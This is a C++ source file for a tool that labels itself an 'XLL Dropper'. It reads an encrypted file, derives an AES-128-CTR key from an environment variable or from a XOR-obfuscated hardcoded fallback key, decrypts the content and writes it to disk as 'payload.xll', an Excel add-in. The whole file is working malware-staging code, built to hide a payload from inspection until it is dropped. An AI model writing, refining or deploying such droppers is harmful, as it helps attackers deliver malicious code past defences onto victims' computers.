#include <iostream>
#include <fstream>
#include <vector>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstdlib>
#include <cstring>

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

// Fallback key (should be overridden by environment variable)
uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

inline void decryptKey(uint8_t* keyBuf) {
    // Try to get key from environment variable first
    const char* envKey = std::getenv("ENCRYPTION_KEY");
    if (envKey && strlen(envKey) >= keyLen) {
        // Use environment variable key
        for (size_t i = 0; i < keyLen; ++i) {
            keyBuf[i] = static_cast<uint8_t>(envKey[i]);
        }
    } else {
        // Fallback to obfuscated key
        for (size_t i = 0; i < keyLen; ++i) {
            keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
        }
    }
}

// Decrypts data using AES-128 CTR with streaming support
bool aesCtrCryptStream(std::ifstream& inFile, std::ofstream& outFile,
                       const unsigned char* aesKey, const unsigned char* nonce) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    bool ok = EVP_DecryptInit_ex(ctx, EVP_aes_128_ctr(), nullptr, aesKey, nonce) == 1;
    if (!ok) { EVP_CIPHER_CTX_free(ctx); return false; }

    std::vector<unsigned char> inBuffer(4096);
    std::vector<unsigned char> outBuffer(4096 + EVP_MAX_BLOCK_LENGTH);

    while (inFile.read(reinterpret_cast<char*>(inBuffer.data()), inBuffer.size()) || inFile.gcount() > 0) {
        std::streamsize bytesRead = inFile.gcount();
        int outLen = 0;
        ok = EVP_DecryptUpdate(ctx, outBuffer.data(), &outLen,
                              inBuffer.data(), static_cast<int>(bytesRead)) == 1;
        if (!ok) break;
        outFile.write(reinterpret_cast<char*>(outBuffer.data()), outLen);
    }

    int finalLen = 0;
    if (ok) ok = EVP_DecryptFinal_ex(ctx, outBuffer.data(), &finalLen) == 1;
    if (ok && finalLen > 0) {
        outFile.write(reinterpret_cast<char*>(outBuffer.data()), finalLen);
    }

    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

int main(int argc, char* argv[]) {
    std::cout << "XLL Dropper - decrypts and writes XLL file." << std::endl;
    if (argc < 2 || argc > 3) {
        std::cerr << "Usage: xll_dropper <encrypted_xll> [destination_path]" << std::endl;
        return 1;
    }
    const char* inPath = argv[1];
    const char* outPath = (argc == 3) ? argv[2] : "payload.xll";

    // Open input file for streaming
    std::ifstream fin(inPath, std::ios::binary);
    if (!fin) {
        std::cerr << "Failed to open input file." << std::endl;
        return 1;
    }

    // Read nonce from the beginning of the file
    unsigned char nonce[16];
    if (!fin.read(reinterpret_cast<char*>(nonce), 16)) {
        std::cerr << "Failed to read nonce from input file." << std::endl;
        return 1;
    }

    // Open output file
    std::ofstream fout(outPath, std::ios::binary);
    if (!fout) {
        std::cerr << "Failed to open output file for writing." << std::endl;
        return 1;
    }

    // Prepare AES key (16 bytes)
    unsigned char aesKey[16];
    uint8_t key[keyLen];
    decryptKey(key);
    for (size_t i = 0; i < 16; ++i) aesKey[i] = key[i % keyLen];

    // Decrypt using streaming
    if (!aesCtrCryptStream(fin, fout, aesKey, nonce)) {
        std::cerr << "AES decryption failed." << std::endl;
        return 1;
    }

    fin.close();
    fout.close();

    std::cout << "Dropped XLL to " << outPath << std::endl;
    return 0;
}